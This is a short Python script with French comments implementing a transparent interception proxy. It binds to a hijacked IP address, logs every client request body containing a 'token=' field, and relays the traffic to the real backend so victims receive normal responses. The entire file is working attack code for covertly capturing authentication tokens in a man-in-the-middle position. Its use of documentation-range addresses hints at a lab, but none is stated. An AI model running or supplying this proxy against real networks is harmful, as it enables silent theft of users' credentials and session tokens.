#!/usr/bin/env python3
"""Proxy d'interception transparent.

Ecoute sur 198.51.100.10:80 (l'IP hijackee, liee localement), journalise le
corps des requetes (le jeton client) et reemet vers le VRAI service via le
lien lateral 172.16.0.1 -> le client recoit une reponse normale.
"""
import socket, threading, sys

REAL = ("172.16.0.1", 80)

def pipe(src, dst, tag):
    try:
        while True:
            data = src.recv(65535)
            if not data:
                break
            if tag == "C>S" and b"token=" in data:
                print("[INTERCEPTE]", data.decode("utf-8", "replace").strip().splitlines()[-1], flush=True)
            dst.sendall(data)
    except OSError:
        pass
    finally:
        try: dst.shutdown(socket.SHUT_WR)
        except OSError: pass

def handle(cli):
    srv = socket.create_connection(REAL)
    threading.Thread(target=pipe, args=(cli, srv, "C>S"), daemon=True).start()
    pipe(srv, cli, "S>C")
    cli.close(); srv.close()

def main():
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 80)); s.listen(16)
    print("proxy en ecoute sur :80 -> reemission vers", REAL, flush=True)
    while True:
        cli, _ = s.accept()
        threading.Thread(target=handle, args=(cli,), daemon=True).start()

if __name__ == "__main__":
    main()
